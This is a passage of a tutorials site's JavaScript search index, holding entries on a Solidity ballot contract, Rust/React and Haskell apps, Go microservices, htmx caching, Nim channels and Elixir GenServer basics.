voters[to]; require(delegate_.weight \u003e= 1); sender.voted = true; sender.delegate = to; if (delegate_.voted) { proposals[delegate_.vote].voteCount += sender.weight; } else { delegate_.weight += sender.weight; } } Voters can delegate their vote to another address. Voting link function vote(uint proposal) external { Voter storage sender = voters[msg.sender]; require(sender.weight != 0, \"Has no right to vote\"); require(!sender.voted, \"Already voted.\"); sender.voted = true; sender.vote = proposal; proposals[proposal].voteCount += sender.weight; } Voters directly vote for a proposal. 3. Vote Counting link function winningProposal() public view returns (uint winningProposal_) { uint winningVoteCount = 0; for (uint p = 0; p \u003c proposals.length; p++) { if (proposals[p].voteCount \u003e winningVoteCount) { winningVoteCount = proposals[p].voteCount; winningProposal_ = p; } } } // Calls winningProposal() function to get the index // of the winner contained in the proposals array and then // returns the name of the winner function winnerName() external view returns (bytes32 winnerName_) { winnerName_ = proposals[winningProposal()].name; } Computes the winning proposal based on the highest accumulated votes. Conclusion linkCongratulations! You’ve built a decentralized voting contract in Solidity. This contract enables secure and transparent voting, showcasing the power of blockchain technology in governance systems. Feel free to explore further and customize the contract according to your requirements. Happy coding!\nComplete Contract linkThe complete contract should look like this:\n// SPDX-License-Identifier: GPL-3.0 pragma solidity \u003e=0.7.0 \u003c0.9.0; /// @title Voting with delegation. contract Ballot { // This declares a new complex type which will // be used for variables later. // It will represent a single voter. struct Voter { uint weight; // weight is accumulated by delegation bool voted; // if true, that person already voted address delegate; // person delegated to uint vote; // index of the voted proposal } // This is a type for a single proposal. struct Proposal { bytes32 name; // short name (up to 32 bytes) uint voteCount; // number of accumulated votes } address public chairperson; // This declares a state variable that // stores a `Voter` struct for each possible address. mapping(address =\u003e Voter) public voters; // A dynamically-sized array of `Proposal` structs. Proposal[] public proposals; /// Create a new ballot to choose one of `proposalNames`. constructor(bytes32[] memory proposalNames) { chairperson = msg.sender; voters[chairperson].weight = 1; // For each of the provided proposal names, // create a new proposal object and add it // to the end of the array. for (uint i = 0; i \u003c proposalNames.length; i++) { // `Proposal({...})` creates a temporary // Proposal object and `proposals.push(...)` // appends it to the end of `proposals`. proposals.push(Proposal({ name: proposalNames[i], voteCount: 0 })); } } // Give `voter` the right to vote on this ballot. // May only be called by `chairperson`. function giveRightToVote(address voter) external { // If the first argument of `require` evaluates // to `false`, execution terminates and all // changes to the state and to Ether balances // are reverted. // This used to consume all gas in old EVM versions, but // not anymore. // It is often a good idea to use `require` to check if // functions are called correctly. // As a second argument, you can also provide an // explanation about what went wrong. require( msg.sender == chairperson, \"Only chairperson can give right to vote.\" ); require( !voters[voter].voted, \"The voter already voted.\" ); require(voters[voter].weight == 0); voters[voter].weight = 1; } /// Delegate your vote to the voter `to`. function delegate(address to) external { // assigns reference Voter storage sender = voters[msg.sender]; require(sender.weight != 0, \"You have no right to vote\"); require(!sender.voted, \"You already voted.\"); require(to != msg.sender, \"Self-delegation is disallowed.\"); // Forward the delegation as long as // `to` also delegated. // In general, such loops are very dangerous, // because if they run too long, they might // need more gas than is available in a block. // In this case, the delegation will not be executed, // but in other situations, such loops might // cause a contract to get \"stuck\" completely. while (voters[to].delegate != address(0)) { to = voters[to].delegate; // We found a loop in the delegation, not allowed. require(to != msg.sender, \"Found loop in delegation.\"); } Voter storage delegate_ = voters[to]; // Voters cannot delegate to accounts that cannot vote. require(delegate_.weight \u003e= 1); // Since `sender` is a reference, this // modifies `voters[msg.sender]`. sender.voted = true; sender.delegate = to; if (delegate_.voted) { // If the delegate already voted, // directly add to the number of votes proposals[delegate_.vote].voteCount += sender.weight; } else { // If the delegate did not vote yet, // add to her weight. delegate_.weight += sender.weight; } } /// Give your vote (including votes delegated to you) /// to proposal `proposals[proposal].name`. function vote(uint proposal) external { Voter storage sender = voters[msg.sender]; require(sender.weight != 0, \"Has no right to vote\"); require(!sender.voted, \"Already voted.\"); sender.voted = true; sender.vote = proposal; // If `proposal` is out of the range of the array, // this will throw automatically and revert all // changes. proposals[proposal].voteCount += sender.weight; } /// @dev Computes the winning proposal taking all /// previous votes into account. function winningProposal() public view returns (uint winningProposal_) { uint winningVoteCount = 0; for (uint p = 0; p \u003c proposals.length; p++) { if (proposals[p].voteCount \u003e winningVoteCount) { winningVoteCount = proposals[p].voteCount; winningProposal_ = p; } } } // Calls winningProposal() function to get the index // of the winner contained in the proposals array and then // returns the name of the winner function winnerName() external view returns (bytes32 winnerName_) { winnerName_ = proposals[winningProposal()].name; } } "
            }
        );
    index.add(
            {
                id:  50 ,
                href: "\/tutorials\/docs\/full-stack-projects\/full-stack-projects\/note_taking_application_using_rust_and_react\/",
                title: "Building a Note-Taking Application with Rust and React",
                description: "In this tutorial, we’ll build a simple note-taking application using Rust for the backend and React for the frontend. Our Rust backend will handle note data and provide a RESTful API for the React frontend to interact with.\nPrerequisites linkBefore we start, make sure you have the following installed:\nRust Node.js Cargo SQLite Create React App Backend: Rust with Actix-web and SQLite linkStep 1: Create a new Rust project linkOpen your terminal and create a new Rust project:",
                content: "In this tutorial, we’ll build a simple note-taking application using Rust for the backend and React for the frontend. Our Rust backend will handle note data and provide a RESTful API for the React frontend to interact with.\nPrerequisites linkBefore we start, make sure you have the following installed:\nRust Node.js Cargo SQLite Create React App Backend: Rust with Actix-web and SQLite linkStep 1: Create a new Rust project linkOpen your terminal and create a new Rust project:\ncargo new note_taking_backend cd note_taking_backend Step 2: Add dependencies linkOpen Cargo.toml and add the following dependencies:\n[dependencies] actix-web = \"4.0\" serde = { version = \"1.0\", features = [\"derive\"] } serde_json = \"1.0\" serde_derive = \"1.0\" sqlx = { version = \"0.5\", features = [\"sqlite\", \"runtime-actix-native-tls\"] } uuid = \"1.0\" dotenv = \"0.15\" Step 3: Set up the SQLite database linkCreate a .env file in the root of your project with the following content:\nDATABASE_URL=sqlite:notes.db Step 4: Create the backend logic linkIn src/main.rs, add the following code:\nuse actix_web::{web, App, HttpResponse, HttpServer, Responder}; use serde::{Deserialize, Serialize}; use sqlx::{sqlite::SqlitePool, Pool}; use std::sync::Mutex; use uuid::Uuid; use dotenv::dotenv; use std::env; #[derive(Serialize, Deserialize)] struct Note { id: String, title: String, content: String, } struct AppState { db_pool: Pool, } #[actix_web::main] async fn main() -\u003e std::io::Result\u003c()\u003e { dotenv().ok(); let database_url = env::var(\"DATABASE_URL\").expect(\"DATABASE_URL must be set\"); let db_pool = SqlitePool::connect(\u0026database_url).await.unwrap(); sqlx::query( \"CREATE TABLE IF NOT EXISTS notes ( id TEXT PRIMARY KEY, title TEXT NOT NULL, content TEXT NOT NULL )\", ) .execute(\u0026db_pool) .await .unwrap(); let app_state = web::Data::new(AppState { db_pool }); HttpServer::new(move || { App::new() .app_data(app_state.clone()) .route(\"/notes\", web::get().to(get_notes)) .route(\"/notes\", web::post().to(add_note)) }) .bind(\"127.0.0.1:8080\")? .run() .await } async fn get_notes(data: web::Data) -\u003e impl Responder { let notes = sqlx::query_as!(Note, \"SELECT id, title, content FROM notes\") .fetch_all(\u0026data.db_pool) .await .unwrap(); HttpResponse::Ok().json(notes) } #[derive(Deserialize)] struct CreateNote { title: String, content: String, } async fn add_note( data: web::Data, note: web::Json, ) -\u003e impl Responder { let new_note = Note { id: Uuid::new_v4().to_string(), title: note.title.clone(), content: note.content.clone(), }; sqlx::query!( \"INSERT INTO notes (id, title, content) VALUES (?, ?, ?)\", new_note.id, new_note.title, new_note.content ) .execute(\u0026data.db_pool) .await .unwrap(); HttpResponse::Created().finish() } Step 5: Run the backend linkStart the backend server by running:\ncargo run Your backend server should now be running on http://127.0.0.1:8080.\nFrontend: React linkStep 1: Create a new React project linkIn a separate terminal window, create a new React project:\nnpx create-react-app note-taking-frontend cd note-taking-frontend Step 2: Install Axios linkWe’ll use Axios to make HTTP requests to our backend. Install it using:\nnpm install axios Step 3: Create the frontend logic linkReplace the content of src/App.js with the following code:\nimport React, { useState, useEffect } from 'react'; import axios from 'axios'; import './App.css'; function App() { const [notes, setNotes] = useState([]); const [title, setTitle] = useState(''); const [content, setContent] = useState(''); useEffect(() =\u003e { fetchNotes(); }, []); const fetchNotes = async () =\u003e { const response = await axios.get('http://127.0.0.1:8080/notes'); setNotes(response.data); }; const addNote = async () =\u003e { await axios.post('http://127.0.0.1:8080/notes', { title, content, }); setTitle(''); setContent(''); fetchNotes(); }; return ( Note Taking App "
            }
        );
    index.add(
            {
                id:  51 ,
                href: "\/tutorials\/docs\/golang\/golang\/building-real-world-application-go\/",
                title: "Building a Real-World Application in Go",
                description: "Learn how to plan, design, implement, test, and deploy a real-world application using Go. This guide covers practical tips for logging, configuration, and versioning to enhance your Go projects.",
                content: ""
            }
        );
    index.add(
            {
                id:  52 ,
                href: "\/tutorials\/docs\/haskell\/haskell\/building-real-world-haskell-application\/",
                title: "Building a Real-World Haskell Application",
                description: "Learn how to design, implement, test, and deploy a real-world Haskell application. This comprehensive guide includes practical examples, complete code, and tips for incorporating CI/CD.",
                content: "Introduction: linkEmbarking on building a real-world application in Haskell is an exciting challenge that combines Haskell’s powerful features with software engineering best practices. In this guide, we’ll walk through the process of designing, implementing, testing, and deploying a Haskell application, complete with continuous integration and deployment. Our example project will be a simple web API for managing tasks, utilizing libraries like Scotty for web routing and Persistent for database operations.\nDesigning a Haskell Project from Scratch linkProject Setup:\nDefine the Project Structure: Organize your project into logical modules. For a web application, typical modules might include:\nMain.hs for the application entry point. Config.hs for configuration settings. Database.hs for database interactions. Routes.hs for web routes. Choose Libraries and Tools:\nWeb Framework: Scotty Database Access: Persistent Testing: HUnit and QuickCheck Logging: Monad-Logger Example stack.yaml and .cabal file setup for dependency management.\nImplementing Your Application linkDeveloping the Web API:\nSetting up Routes with Scotty:\n{-# LANGUAGE OverloadedStrings #-} import Web.Scotty import Control.Monad.IO.Class (liftIO) main :: IO () main = scotty 3000 $ do get \"/tasks\" $ do tasks \u003c- liftIO fetchAllTasks json tasks post \"/tasks\" $ do task \u003c- jsonData liftIO $ saveTask task json task Handling Database Operations:\n{-# LANGUAGE GADTs, TypeFamilies, TemplateHaskell, QuasiQuotes, GeneralizedNewtypeDeriving, MultiParamTypeClasses, OverloadedStrings #-} import Database.Persist import Database.Persist.Sqlite import Database.Persist.TH share [mkPersist sqlSettings, mkMigrate \"migrateAll\"] [persistLowerCase| Task description String completed Bool deriving Show |] runDb :: SqlPersistM a -\u003e IO a runDb query = runSqlite \"database.db\" $ do runMigration migrateAll query Testing and Deployment linkUnit Testing with HUnit and QuickCheck:\nWriting Unit Tests: import Test.HUnit import Test.QuickCheck testListReversal = TestCase $ assertEqual \"Should reverse a list\" [3, 2, 1] (reverse [1, 2, 3]) prop_checkReversal :: [Int] -\u003e Bool prop_checkReversal xs = reverse (reverse xs) == xs main :: IO () main = do runTestTT testListReversal quickCheck prop_checkReversal Deployment:\nDeploy using Docker for containerization.\nSet up a basic Dockerfile:\nFROM haskell:8.8 WORKDIR /app COPY . /app RUN stack setup RUN stack build --copy-bins CMD [\"stack\", \"exec\", \"my-haskell-app\"] Incorporating Continuous Integration and Deployment linkSetting Up CI/CD with GitHub Actions:\nCreate a .github/workflows/haskell.yml file: name: Haskell CI on: [push] jobs: build: runs-on: ubuntu-latest steps: - uses: actions/checkout@v2 - name: Setup Stack uses: actions/setup-haskell@v1.1 with: ghc-version: '8.8' # Set the GHC version - name: Build run: stack build - name: Test run: stack test Conclusion:\nBuilding a real-world Haskell application involves careful planning\n, thorough testing, and robust deployment strategies. By following the steps outlined in this guide, you can ensure that your Haskell application is well-structured, efficiently tested, and ready for production. Dive into Haskell’s rich ecosystem and leverage its powerful features to build scalable and performant applications.\nFrequently Asked Questions:\nQ: What are some common challenges when scaling Haskell applications? A: Handling stateful components and integrating with non-functional systems are common challenges. Using advanced Haskell features like STM (Software Transactional Memory) can help mitigate these issues.\nQ: How can I monitor the performance of my Haskell application in production? A: Use monitoring tools such as Prometheus with Haskell libraries that support metrics collection to keep track of application performance and health.\n"
            }
        );
    index.add(
            {
                id:  53 ,
                href: "\/tutorials\/docs\/rust\/rust\/building_robust_cli_tool_rust\/",
                title: "Building a Robust CLI Tool with Rust",
                description: "Learn how to build a powerful and user-friendly CLI tool in Rust with this comprehensive guide. Dive into structuring a CLI project, parsing command-line arguments, and managing input effectively. This post is filled with technical insights, practical coding examples, and best practices to help you develop sophisticated CLI applications in Rust.",
                content: "Introduction linkCommand-line tools are vital for automation, system tasks, and quick data manipulation. Rust, with its focus on safety and performance, provides a compelling platform for building reliable and efficient CLI tools. This guide delves into the nuances of Rust CLI application development, offering insights into effective project structuring, advanced argument parsing, and robust error handling.\nStructuring a CLI Project in Rust linkEffective project structure is crucial for maintainability and scalability. Rust projects benefit significantly from a thoughtful organization, separating concerns and enhancing code reuse.\nCore Components of a Rust CLI Project Structure:\nmain.rs: Serves as the entry point of the application. It initializes the application, handles high-level logic, and manages command-line arguments. lib.rs: Contains the core functionality and business logic. Structuring the bulk of your application’s logic here promotes reusability and testability. cli.rs: Dedicated to CLI handling, such as argument parsing. This abstraction simplifies main.rs and focuses on user interaction. config.rs: Manages configurations, which might come from command-line options, environment variables, or configuration files. Example Project Layout:\nyour_cli_app/ ├── Cargo.toml └── src/ ├── main.rs ├── lib.rs ├── cli.rs ├── config.rs Advanced Command-Line Parsing with clap linkclap is a versatile library for parsing command-line arguments and options in Rust, offering extensive functionality for even the most complex CLI applications.\nImplementing clap for Robust Argument Handling:\nDefine your CLI’s structure using clap’s builders for commands, arguments, and subcommands, enabling detailed help messages, version management, and validation rules. Utilize clap’s ability to derive settings from structs, which can be particularly clean and maintainable for complex configurations. Example of Using clap with Struct Derivation:\nuse clap::Clap; /// Main configuration for the application #[derive(Clap)] #[clap(name = \"app\", about = \"An example of Rust CLI\", version = \"1.0\")] struct AppConfig { #[clap(short, long, about = \"Sets a custom config file\")] config: String, #[clap(name = \"INPUT\", about = \"Sets the input file to use\", required = true)] input: String, } fn main() { let cfg = AppConfig::parse(); println!(\"Using config: {}\", cfg.config); println!(\"Input file: {}\", cfg.input); } Handling External APIs and Data Streams linkIntegrating external APIs or handling data streams efficiently in a CLI tool often requires asynchronous processing. Rust’s async/await syntax, combined with powerful async libraries like tokio or async-std, allows for non-blocking I/O operations.\nExample of Asynchronous Data Handling:\nuse tokio::io::{self, AsyncReadExt}; async fn process_input_stream(stream: \u0026mut T) -\u003e io::Result\u003c()\u003e { let mut buffer = Vec::new(); stream.read_to_end(\u0026mut buffer).await?; println!(\"Read {} bytes from the stream.\", buffer.len()); Ok(()) } #[tokio::main] async fn main() { let mut stdin = io::stdin(); // Use tokio's stdin for async reading process_input_stream(\u0026mut stdin).await.unwrap(); } Best Practices for Rust CLI Tools link Error Handling: Use Rust’s Result and Option types to handle errors and absent values gracefully. Provide clear, actionable error messages for the user. Performance Optimization: Profile your application to identify bottlenecks. Rust’s zero-cost abstractions allow for optimizations that don’t compromise readability or safety. Testing: Develop comprehensive tests for your parsing logic and core functionalities. Rust’s cargo offers built-in test frameworks that integrate seamlessly with your codebase. Conclusion linkBuilding command-line tools in Rust involves understanding not only Rust’s syntax but also effective patterns and practices for CLI development. By leveraging Rust’s powerful features like clap for argument parsing and async/await for handling I/O-bound operations, developers can create tools that are not only fast and reliable but also maintainable and scalable.\n"
            }
        );
    index.add(
            {
                id:  54 ,
                href: "\/tutorials\/docs\/full-stack-projects\/full-stack-projects\/expense_tracker_using_rust_react\/",
                title: "Building an Expense Tracker with Rust and React",
                description: "How to install and use libraries",
                content: "In this tutorial, we’ll walk through creating a simple expense tracker application using Rust for the backend and React for the frontend. Our Rust backend will handle expense data and provide an API for the React frontend to interact with.\nPrerequisites linkBefore we start, make sure you have the following installed:\nRust Node.js Cargo Create React App Backend: Rust with Actix-web linkFirst, let’s set up our Rust backend using Actix-web.\nStep 1: Create a new Rust project linkOpen your terminal and create a new Rust project:\ncargo new expense_tracker_backend cd expense_tracker_backend Step 2: Add dependencies linkOpen Cargo.toml and add the following dependencies:\n[dependencies] actix-web = \"4.0\" serde = { version = \"1.0\", features = [\"derive\"] } serde_json = \"1.0\" uuid = \"1.0\" Step 3: Create the backend logic linkIn src/main.rs, add the following code:\nuse actix_web::{web, App, HttpResponse, HttpServer, Responder}; use serde::{Deserialize, Serialize}; use std::sync::Mutex; use uuid::Uuid; #[derive(Serialize, Deserialize)] struct Expense { id: String, description: String, amount: f64, } struct AppState { expenses: Mutex"
            }
        );
    index.add(
            {
                id:  55 ,
                href: "\/tutorials\/docs\/golang\/golang\/microservices-with-go\/",
                title: "Building Microservices with Go",
                description: "Explore how to design, deploy, and scale microservices using Go. This comprehensive guide covers the best practices for developing high-performance microservices architectures in Go.",
                content: "Introduction:\nHello, Go developers! In the landscape of modern software architecture, microservices have become a cornerstone for building scalable, resilient, and manageable applications. With its excellent support for concurrency, robust standard library, and efficient execution, Go is an ideal language for developing microservices. This blog will guide you through designing, deploying, and scaling microservices with Go, highlighting best practices and essential strategies to maximize your application’s potential.\n1. Designing Microservices in Go\na. Principles of Microservice Architecture:\nMicroservices architecture involves developing a single application as a suite of small services, each running in its own process and communicating with lightweight mechanisms, often an HTTP resource API. Each service is built around a specific business capability and is independently deployable by fully automated deployment machinery.\nb. Go for Microservices:\nGo’s design is naturally aligned with the principles of microservices:\nConcurrency: Go’s goroutines and channels provide built-in features to handle concurrent operations, which is essential for handling multiple independent service requests simultaneously. Compilability: Go compiles into a single static binary by default, simplifying deployment and reducing runtime dependencies. Performance: Go offers the speed of a compiled language with the ease of garbage collection, making it suitable for services that require high performance under load. c. Microservice Design with Go:\nWhen designing microservices in Go, consider the following:\nDomain-Driven Design (DDD): Structure your services around the business domain. This includes defining clear module boundaries, typically organized around business capabilities. Decouple Service Dependencies: Use asynchronous communication, such as message queues or event-driven architectures, to reduce direct dependencies between services. API First Design: Define APIs using specifications like OpenAPI/Swagger to ensure that services communicate effectively and that contracts are clear. 2. Deploying Go Applications as Microservices\na. Containerization with Docker:\nContainerization encapsulates a microservice in its runtime environment, making it easy to deploy across different systems. Go’s static binary can be packaged inside a minimal Docker container which reduces overhead and improves security.\n# Start from a lightweight base image, e.g., Alpine Linux FROM alpine:latest # Add the Go binary COPY ./bin/mygoservice /app/mygoservice # Run the binary CMD [\"/app/mygoservice\"] b. Orchestration with Kubernetes:\nKubernetes is an open-source system for automating deployment, scaling, and management of containerized applications. It complements Go’s microservices by handling:\nService Discovery: Automatically identifies services and makes them accessible to other services. Load Balancing: Distributes incoming service requests efficiently. Auto-scaling: Adjusts the number of running service instances based on load. 3. Best Practices for Scalability and Performance\na. Scalability:\nEnsure your Go microservices are stateless wherever possible, which simplifies scaling as any instance can handle any request. Store state in external systems like databases or caching layers.\nb. Performance Optimization:\nProfiling and Benchmarks: Regularly use Go’s built-in profiling tools to identify bottlenecks. Optimize Resource Allocation: Tune system parameters such as Goroutine numbers and operating system limits to match your service’s load requirements. c. Monitoring and Logging:\nImplement robust monitoring and logging to track the health and performance of your microservices. Tools like Prometheus for monitoring and fluentd or logrus for logging can be integrated into your Go applications to provide insights into operations and help with debugging.\nConclusion:\nBuilding microservices with Go offers a powerful way to construct reliable, efficient, and independently scalable software components. By following the guidelines outlined in this blog—from design and deployment to scaling and monitoring—you can harness the full potential of Go to develop superior microservices that stand the test of scale and complexity.\nNow, if you are interested in upskilling in 2024 with AI development, check out this 6 AI advanced projects with Go where you learng about building with AI and getting the best knowledge there is currently. Here’s the link\nFrequently Asked Questions:\nQ: How many microservices should a Go application have? A: The number of services should be based on your application’s complexity, team structure, and scalability needs. Each microservice should ideally represent a single business capability.\nQ: Can Go be used for monolithic applications? A: Absolutely, Go is versatile enough to build both monolithic applications and microservices, depending on your project requirements and team capabilities.\n"
            }
        );
    index.add(
            {
                id:  56 ,
                href: "\/tutorials\/docs\/htmx\/htmx\/caching\/",
                title: "Caching",
                description: "Learn about what HTMX is and how you can use it.",
                content: "htmx works with standard HTTP caching mechanisms out of the box.\nIf your server adds the Last-Modified HTTP response header to the response for a given URL, the browser will automatically add the If-Modified-Since request HTTP header to the next requests to the same URL. Be mindful that if your server can render different content for the same URL depending on some other headers, you need to use the Vary response HTTP header. For example, if your server renders the full HTML when the HX-Request header is missing or false, and it renders a fragment of that HTML when HX-Request: true, you need to add Vary: HX-Request. That causes the cache to be keyed based on a composite of the response URL and the HX-Request request header — rather than being based just on the response URL.\nIf you are unable (or unwilling) to use the Vary header, you can alternatively set the configuration parameter getCacheBusterParam to true. If this configuration variable is set, htmx will include a cache-busting parameter in GET requests that it makes, which will prevent browsers from caching htmx-based and non-htmx based responses in the same cache slot.\nhtmx also works with ETag as expected. Be mindful that if your server can render different content for the same URL (for example, depending on the value of the HX-Request header), the server needs to generate a different ETag for each content.\n"
            }
        );
    index.add(
            {
                id:  57 ,
                href: "\/tutorials\/docs\/nim\/nim\/channels_in_nim\/",
                title: "Channels in Nim",
                description: "Nim Lang description",
                content: "Nim provides channels as a mechanism for thread communication. Channels allow threads to send and receive messages in a synchronized manner. Here’s a guide on how to use channels in Nim for thread communication.\nExample with Plain Threads linkFirst, let’s look at an example using plain threads. This involves creating and managing threads manually.\nimport std/os # for sleep var # create a channel to send/recv strings commChan: Channel[string] sender: Thread[void] recver: Thread[void] proc sendMsg() = sleep(500) # send a message in the channel commChan.send(\"Hi\") proc recvMsg() = # block on the channel, waiting for output let msg: string = commChan.recv() echo \"Received message: \" \u0026 msg # very important: channels must be opened before they can be used commChan.open() createThread(sender, sendMsg) createThread(recver, recvMsg) joinThreads(sender, recver) In this example:\nA Channel[string] is created to send and receive strings. Two threads (sender and recver) are created to send and receive messages through the channel. commChan.open() is called to open the channel before use. sendMsg sends a message after a delay. recvMsg waits for and prints the received message. Using spawn from threadpool linkNim also provides a higher-level abstraction for thread management via the threadpool module. This allows for easier creation and management of threads using the spawn procedure.\nimport threadpool, std/os var commChan: Channel[string] proc sendMsg() = sleep(500) commChan.send(\"Hi there!\") proc recvMsg() = let msg = commChan.recv() echo \"Received msg: \" \u0026 msg commChan.open() spawn recvMsg() spawn sendMsg() sync() In this example:\nThe spawn procedure is used to create and run threads. sync() is called to wait for all spawned threads to finish. Non-blocking Channel Operations linkChannels can also be used in a non-blocking manner. This is useful when you want to attempt to receive messages without blocking the thread if no messages are available.\nwhile true: let tried = commChan.tryRecv() if tried.dataAvailable: echo tried.msg In this example:\ntryRecv() is used to attempt to receive a message without blocking. If a message is available, it is printed. Limiting Channel Size linkYou can set a maximum number of items in a channel when opening it. This limits the number of messages that can be queued in the channel.\n# create a channel to transfer ints var chan: Channel[int] # allow max of 10 items in channel chan.open(10) In this example:\nThe channel is opened with a maximum size of 10 items. If the channel is full, sending new messages will block until space becomes available. To avoid blocking when the channel is full, you can use trySend, which returns immediately with a boolean indicating the success of the operation.\nif not chan.trySend(42): echo \"Failed to send message; channel is full.\" Summary link Channels: Used for thread communication in Nim. Opening Channels: Channels must be opened before use, and can have a specified maximum size. Blocking Operations: recv() blocks until a message is available, and send() blocks if the channel is full. Non-blocking Operations: tryRecv() and trySend() provide non-blocking alternatives. Thread Management: Use plain threads with createThread or higher-level abstractions with spawn. Channels in Nim offer a powerful way to handle thread communication, allowing both blocking and non-blocking operations, and can be easily integrated with Nim’s threading model.\n"
            }
        );
    index.add(
            {
                id:  58 ,
                href: "\/tutorials\/docs\/cheatsheets\/",
                title: "Cheatsheets",
                description: "Making life easy...",
                content: ""
            }
        );
    index.add(
            {
                id:  59 ,
                href: "\/tutorials\/docs\/technical-architecture\/technical-architecture\/choosing_the_right_tech_stack\/",
                title: "Choosing the Right Technology Stack for Your Project",
                description: "Selecting the appropriate technology stack is a crucial decision that can significantly impact the success and sustainability of a project. A technology stack is a combination of programming languages, frameworks, libraries, and tools used to develop and run an application. This post will guide you through the process of choosing the right technology stack by evaluating project requirements, exploring the pros and cons of popular technology stacks, and providing tips for making informed decisions.",
                content: "Selecting the appropriate technology stack is a crucial decision that can significantly impact the success and sustainability of a project. A technology stack is a combination of programming languages, frameworks, libraries, and tools used to develop and run an application. This post will guide you through the process of choosing the right technology stack by evaluating project requirements, exploring the pros and cons of popular technology stacks, and providing tips for making informed decisions.\nEvaluating Project Requirements linkBefore diving into specific technology stacks, it is essential to thoroughly understand the project requirements. These requirements will shape your decision and ensure that the chosen stack aligns with the project’s goals and constraints.\nKey Considerations: link Project Scope and Complexity:\nDetermine the size and complexity of the project. Identify the core functionalities and features needed. Time to Market:\nAssess the urgency of the project. Consider if rapid development and deployment are critical. Budget:\nEstablish a clear budget for development and maintenance. Evaluate the cost of different technologies and their licensing fees. Team Expertise:\nAssess the skill set and experience of your development team. Consider the learning curve associated with new technologies. Scalability and Performance:\nDetermine the expected user load and data volume. Evaluate the need for horizontal and vertical scaling. Security:\nIdentify the security requirements and potential vulnerabilities. Ensure compliance with industry standards and regulations. Long-term Maintainability:\nConsider the ease of maintaining and updating the application. Evaluate the availability of community support and documentation. Pros and Cons of Popular Technology Stacks linkSeveral technology stacks have gained popularity due to their versatility and robust performance. Here, we will discuss the pros and cons of some widely-used stacks.\n1. MEAN Stack linkThe MEAN stack consists of MongoDB, Express.js, Angular, and Node.js. It is a full-stack JavaScript solution, enabling the use of a single language for both client and server-side development.\nPros:\nUnified Language: JavaScript across the entire stack simplifies development. High Performance: Node.js provides a non-blocking, event-driven architecture. Scalability: MongoDB’s schema-less nature allows for flexible data models. Community Support: Extensive resources and community support. Cons:\nSteep Learning Curve: Requires proficiency in multiple JavaScript frameworks. Maturity: Some components may not be as mature as those in other stacks. Database Constraints: MongoDB may not be suitable for all use cases, especially those requiring complex transactions. 2. MERN Stack linkThe MERN stack is similar to MEAN but replaces Angular with React. It includes MongoDB, Express.js, React, and Node.js.\nPros:\nComponent-Based Architecture: React’s component-based architecture promotes reusability. Performance: React offers excellent performance with virtual DOM. SEO-Friendly: React’s server-side rendering improves SEO. Cons:\nLearning Curve: Requires learning React and its ecosystem. Boilerplate Code: Can involve more boilerplate code compared to Angular. 3. LAMP Stack linkThe LAMP stack consists of Linux, Apache, MySQL, and PHP. It is a traditional stack for web development, known for its stability and reliability.\nPros:\nStability: Proven stability and reliability over the years. Cost-Effective: Open-source components reduce costs. Extensive Documentation: Abundant resources and documentation available. Cons:\nPerformance: May not be as performant as newer stacks. Scalability: Scaling can be more complex compared to NoSQL solutions. Language Constraints: Requires proficiency in PHP, which may not be as popular as JavaScript. 4. Django Stack linkThe Django stack includes Python, Django, and a relational database like PostgreSQL. Django is a high-level Python web framework that encourages rapid development.\nPros:\nRapid Development: Django’s built-in features accelerate development. Security: Django includes security features by default. Versatility: Python’s versatility extends beyond web development. Cons:\nLearning Curve: Requires knowledge of Python and Django. Performance: May not match the performance of Node.js for certain use cases. Tips for Making Informed Decisions linkChoosing the right technology stack involves careful consideration and strategic planning. Here are some tips to help you make an informed decision:\n1. Conduct a Thorough Analysis: link Perform a detailed analysis of your project requirements, team expertise, and budget. Create a checklist of must-have features and functionalities. 2. Leverage Prototypes and MVPs: link Build prototypes or minimum viable products (MVPs) to test the stack’s suitability. Gather feedback and iterate based on real-world usage. 3. Consider Future Growth: link Choose a stack that can scale with your project’s growth. Avoid technologies that may become obsolete or unsupported. 4. Evaluate Community and Support: link Opt for technologies with active communities and strong support networks. Ensure access to comprehensive documentation and resources. 5. Balance Innovation and Stability: link While exploring new technologies can be beneficial, prioritize stability and reliability for critical projects. Consider adopting mature technologies with proven track records. 6. Consult with Experts: link Seek advice from experienced developers or consultants. Engage in discussions with your team to gather diverse perspectives. Conclusion linkSelecting the right technology stack is a pivotal decision that can influence the success and longevity of your project. By evaluating your project requirements, understanding the pros and cons of popular technology stacks, and following best practices for informed decision-making, you can choose a stack that aligns with your goals and constraints. Remember that the right stack not only meets current needs but also supports future growth and scalability, ensuring the long-term success of your project.\n"
            }
        );
    index.add(
            {
                id:  60 ,
                href: "\/tutorials\/docs\/elixir\/elixir\/client_server_communication_with_gen_server\/",
                title: "Client-server communication with GenServer",
                description: "In simple state management tutorial, we used agents to represent our buckets. In the introduction to mix, we specified we would like to name each bucket so we can do the following:\nCREATE shopping OK PUT shopping milk 1 OK GET shopping milk 1 OK In the session above we interacted with the “shopping” bucket.\nSince agents are processes, each bucket has a process identifier (PID), but buckets do not have a name.",
                content: "In simple state management tutorial, we used agents to represent our buckets. In the introduction to mix, we specified we would like to name each bucket so we can do the following:\nCREATE shopping OK PUT shopping milk 1 OK GET shopping milk 1 OK In the session above we interacted with the “shopping” bucket.\nSince agents are processes, each bucket has a process identifier (PID), but buckets do not have a name. Back in the Process chapter, we have learned that we can register processes in Elixir by giving them atom names:\nAgent.start_link(fn -\u003e %{} end, name: :shopping) {:ok, #PID\u003c0.43.0\u003e} KV.Bucket.put(:shopping, \"milk\", 1) :ok KV.Bucket.get(:shopping, \"milk\") 1 However, naming dynamic processes with atoms is a terrible idea! If we use atoms, we would need to convert the bucket name (often received from an external client) to atoms, and we should never convert user input to atoms. This is because atoms are not garbage collected. Once an atom is created, it is never reclaimed. Generating atoms from user input would mean the user can inject enough different names to exhaust our system memory!\nIn practice, it is more likely you will reach the Erlang VM limit for the maximum number of atoms before you run out of memory, which will bring your system down regardless.\nInstead of abusing the built-in name facility, we will create our own process registry that associates the bucket name to the bucket process.\nThe registry needs to guarantee that it is always up to date. For example, if one of the bucket processes crashes due to a bug, the registry must notice this change and avoid serving stale entries. In Elixir, we say the registry needs to monitor each bucket. Because our registry needs to be able to receive and handle ad-hoc messages from the system, the Agent API is not enough.\nWe will use a GenServer to create a registry process that can monitor the bucket processes. GenServer provides industrial strength functionality for building servers in both Elixir and OTP.\nPlease read the GenServer module documentation for an overview if you haven’t yet. Once you do so, we are ready to proceed.\nGenServer callbacks linkA GenServer is a process that invokes a limited set of functions under specific conditions. When we used a Agent, we would keep both the client code and the server code side by side, like this:\ndef put(bucket, key, value) do Agent.update(bucket, 